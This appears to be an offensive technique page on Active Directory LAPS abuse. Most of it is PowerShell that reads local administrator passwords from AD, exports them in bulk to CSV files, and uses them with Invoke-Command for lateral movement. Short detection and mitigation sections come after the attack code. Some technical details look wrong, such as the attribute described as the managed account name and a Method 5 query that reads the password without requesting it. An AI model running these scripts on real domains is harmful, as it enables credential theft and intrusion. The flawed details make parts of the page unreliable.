# REC-AD-007: LAPS Account Discovery

**SERVTEP ID:** REC-AD-007  
**Technique Name:** LAPS account discovery  
**MITRE ATT&CK Mapping:** T1087.002 (Account Discovery - Domain Account)  
**CVE Reference:** N/A  
**Environment:** Windows Active Directory  
**Severity:** High  
**Difficulty:** Easy  

---

## Executive Summary

Local Administrator Password Solution (LAPS) automatically manages local administrator account passwords on domain-joined computers. However, overly permissive LAPS password read permissions expose these high-privilege credentials. Attackers enumerate LAPS permissions to identify computers where they can read the local admin password, enabling lateral movement and privilege escalation across the domain.

---

## Objective

Enumerate and exploit LAPS to:
- Discover computers managed by LAPS
- Identify computers with readable LAPS passwords
- Enumerate who has permissions to read LAPS passwords
- Find permissions-vulnerable LAPS deployments
- Discover LAPS storage location in AD
- Map LAPS passwords across infrastructure
- Identify local admin accounts managed by LAPS
- Leverage LAPS passwords for lateral movement

---

## Prerequisites

- Active Directory credentials (any domain user)
- PowerShell with Active Directory module
- LAPS installed in target domain
- Network access to domain controller (LDAP port 389)
- Optional: LAPS PowerShell module (LAPSToolkit, AdmPwd.PS)

---

## Execution Procedures

### Method 1: PowerShell LAPS Discovery

**Step 1:** Detect LAPS deployment
```powershell
# Check if LAPS schema is installed
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=example,DC=com" -Filter "name -like '*LAPS*'"

# Get the LAPS version
$lapsVersion = Get-ADObject -Filter "name -eq 'ms-Mcs-AdmPwd'" -Properties *

if ($lapsVersion) {
  Write-Host "[+] LAPS is installed in this domain"
} else {
  Write-Host "[-] LAPS is NOT installed"
}
```

**Step 2:** Enumerate LAPS-managed computers
```powershell
# Get all computers with LAPS managed passwords
Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" -Properties * |
  Select-Object Name, ms-Mcs-AdmPwdExpirationTime | 
  Export-Csv laps_computers.csv

# Get count of LAPS-managed computers
(Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'").count

# Get computers NOT managed by LAPS (potential gap)
Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -notlike '*'" |
  Select-Object Name
```

**Step 3:** Extract LAPS password (if permissions allow)
```powershell
# Try to read LAPS password for specific computer
$computerName = "WORKSTATION01"
$computer = Get-ADComputer -Filter "Name -eq '$computerName'" -Properties ms-Mcs-AdmPwd

# If current user has read permission, this will return the password
if ($computer."ms-Mcs-AdmPwd") {
  Write-Host "LAPS Password for $computerName : $($computer.'ms-Mcs-AdmPwd')"
} else {
  Write-Host "No permission to read LAPS password or not managed by LAPS"
}

# Bulk export LAPS passwords (if authorized)
Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" -Properties * |
  Select-Object Name, "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime" |
  Export-Csv laps_passwords.csv
```

### Method 2: Enumerate LAPS ACLs and Permissions

**Step 1:** Find who can read LAPS passwords
```powershell
# Get LAPS ACLs for all computers
Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" -Properties * |
  ForEach-Object {
    $computer = $_
    $acl = Get-Acl -Path "AD:\$($computer.DistinguishedName)"
    
    # Look for permissions on ms-Mcs-AdmPwd attribute
    $acl.Access | Where-Object {
      $_.ObjectType -eq "ms-Mcs-AdmPwd" -or 
      $_.ActiveDirectoryRights -contains "ReadProperty"
    } | ForEach-Object {
      Write-Host "$($computer.Name): $($_.IdentityReference) - $($_.ActiveDirectoryRights)"
    }
  }
```

**Step 2:** Identify overly permissive LAPS configurations
```powershell
# Find groups with LAPS read permission
Get-ADGroup -Filter * | ForEach-Object {
  $group = $_
  
  Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" | 
    ForEach-Object {
      $acl = Get-Acl -Path "AD:\$($_.DistinguishedName)"
      
      $permissions = $acl.Access | Where-Object {
        $_.IdentityReference -like "*$($group.Name)*" -and
        $_.ActiveDirectoryRights -contains "GenericRead"
      }
      
      if ($permissions) {
        Write-Host "[HIGH RISK] Group $($group.Name) can read LAPS on $($_.Name)"
      }
    }
}

# Find if "Authenticated Users" or "Domain Users" can read LAPS
Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" |
  ForEach-Object {
    $computer = $_
    $acl = Get-Acl -Path "AD:\$($computer.DistinguishedName)"
    
    $dangerousPerms = $acl.Access | Where-Object {
      ($_.IdentityReference -like "*Authenticated Users*" -or 
       $_.IdentityReference -like "*Domain Users*") -and
      $_.ActiveDirectoryRights -contains "GenericRead"
    }
    
    if ($dangerousPerms) {
      Write-Host "[CRITICAL] Everyone can read LAPS on $($computer.Name)"
    }
  }
```

### Method 3: Using LAPSToolkit for Discovery

**Step 1:** Install and use LAPSToolkit
```powershell
# Download LAPSToolkit
git clone https://github.com/leoloobeek/LAPSToolkit
Import-Module .\LAPSToolkit\LAPSToolkit.ps1

# Get all LAPS-managed computers with readable passwords
Get-LAPSComputers | Select-Object ComputerName, Password, ExpirationTime |
  Export-Csv laps_readable.csv

# Identify computers where current user can read LAPS
Find-LAPSComputers -Domain "example.com"

# Check LAPS permissions across the domain
Get-LAPSPermissions -Domain "example.com"
```

**Step 2:** Analyze LAPS usage patterns
```powershell
# Find LAPS computers by organizational unit
Get-LAPSComputers | Group-Object OU | 
  ForEach-Object {Write-Host "$($_.Name): $($_.Count) computers"}

# Identify servers without LAPS (security gap)
$lapsComputers = Get-LAPSComputers | Select-Object -ExpandProperty ComputerName
Get-ADComputer -Filter "operatingSystem -like '*Server*'" |
  Where-Object {$_.Name -notin $lapsComputers} |
  Select-Object Name
```

### Method 4: Manual LAPS Password Extraction

**Step 1:** Query LAPS attributes directly
```powershell
# Direct LDAP query for LAPS passwords
$searchBase = "CN=Computers,DC=example,DC=com"
$filter = "(ms-Mcs-AdmPwdExpirationTime=*)"

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchBase = $searchBase
$searcher.Filter = $filter
$searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd")
$searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwdExpirationTime")

$results = $searcher.FindAll()

foreach ($result in $results) {
  $computerName = $result.Properties["name"][0]
  $password = $result.Properties["ms-Mcs-AdmPwd"][0]
  $expiration = $result.Properties["ms-Mcs-AdmPwdExpirationTime"][0]
  
  Write-Host "Computer: $computerName"
  Write-Host "  Password: $password"
  Write-Host "  Expires: $expiration"
}
```

**Step 2:** Export LAPS credentials in bulk
```powershell
# Create LAPS export script
$lapsExport = @()

Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" -Properties * |
  ForEach-Object {
    $lapsExport += [PSCustomObject]@{
      ComputerName = $_.Name
      Password = $_."ms-Mcs-AdmPwd"
      ExpirationTime = $_."ms-Mcs-AdmPwdExpirationTime"
      DistinguishedName = $_.DistinguishedName
    }
  }

$lapsExport | Export-Csv laps_dump.csv -NoTypeInformation

# Check for recently changed LAPS passwords (active accounts)
$lapsExport | Where-Object {$_.ExpirationTime -gt (Get-Date)} |
  Select-Object ComputerName, Password
```

### Method 5: Privilege Escalation via LAPS

**Step 1:** Identify computers with readable LAPS
```powershell
# Find computers where current user can read LAPS
# Then use those credentials for lateral movement

# Get list of LAPS-readable computers
$accessibleLAPS = @()

Get-ADComputer -Filter "ms-Mcs-AdmPwdExpirationTime -like '*'" |
  ForEach-Object {
    try {
      $password = $_."ms-Mcs-AdmPwd"
      if ($password) {
        $accessibleLAPS += [PSCustomObject]@{
          ComputerName = $_.Name
          Password = $password
          AccessLevel = "Local Admin"
        }
      }
    } catch {}
  }

Write-Host "Computers with readable LAPS passwords: $($accessibleLAPS.count)"

# Use LAPS passwords for lateral movement
foreach ($laps in $accessibleLAPS) {
  Write-Host "Attempting access to $($laps.ComputerName)..."
  
  # Create PSCredential object
  $securePassword = ConvertTo-SecureString $laps.Password -AsPlainText -Force
  $credential = New-Object System.Management.Automation.PSCredential("Administrator", $securePassword)
  
  # Execute command on remote computer
  Invoke-Command -ComputerName $laps.ComputerName -Credential $credential -ScriptBlock {
    whoami
    Get-Service
  }
}
```

---

## Technical Deep Dive

### LAPS Architecture

**Storage:**
- LAPS passwords stored in AD attribute: `ms-Mcs-AdmPwd`
- Expiration time: `ms-Mcs-AdmPwdExpirationTime`
- Managed account name: `ms-Mcs-AdmPwdResetInterval`

**Permissions:**
- Default: Only computer object and Domain Admins can read
- Often overly permissive in practice
- Support teams may have read access

### LAPS Vulnerabilities

| Issue | Risk | Exploitation |
|-------|------|---|
| Overly permissive ACLs | High | Read LAPS password |
| Non-expiring passwords | Medium | Use old password |
| Centralized storage (AD) | High | One ACL issue = many computers |

---

## Detection Strategies (Blue Team)

### LAPS Activity Monitoring

1. **Password Read Auditing**
   - Event ID 4662: Directory Service Object Accessed
   - Alert on LAPS attribute access (ms-Mcs-AdmPwd)
   - Monitor unsuccessful read attempts

2. **LAPS Configuration Auditing**
   - Regular ACL reviews
   - Ensure only appropriate groups have read permissions
   - Monitor for permission changes

---

## Mitigation Strategies

1. **Immediate Actions**
   - Audit LAPS ACLs
   - Remove overly permissive permissions
   - Rotate all LAPS passwords

2. **Detection & Response**
   - Enable Active Directory auditing
   - Monitor LAPS password reads
   - Alert on unauthorized access attempts

3. **Long-term Security**
   - Implement LAPS v2 (Windows 11/Server 2022+)
   - Use Azure AD-integrated LAPS (cloud-native)
   - Restrict LAPS password readers to absolutely necessary groups
   - Regular LAPS ACL audits
   - Just-in-time (JIT) password access

---

## References & Further Reading

- [Microsoft LAPS Documentation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps)
- [LAPSToolkit GitHub](https://github.com/leoloobeek/LAPSToolkit)
- [LAPS Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/laps/laps-concepts)

---

## Related SERVTEP Techniques

- **REC-AD-004**: SPN scanning (find targets for lateral movement)
- **REC-AD-005**: BadPwdCount monitoring
- **PE-VALID-002**: LAPS password abuse for privilege escalation

---

## Timeline

| Phase | Duration | Difficulty |
|-------|----------|------------|
| LAPS detection | 1-2 minutes | Easy |
| ACL enumeration | 2-5 minutes | Easy |
| Password extraction | 1-3 minutes | Easy |
| Lateral movement | 5+ minutes | Medium |

---

**Last Updated:** December 2025  
**Classification:** SERVTEP Research Division  
**Status:** Verified & Operational
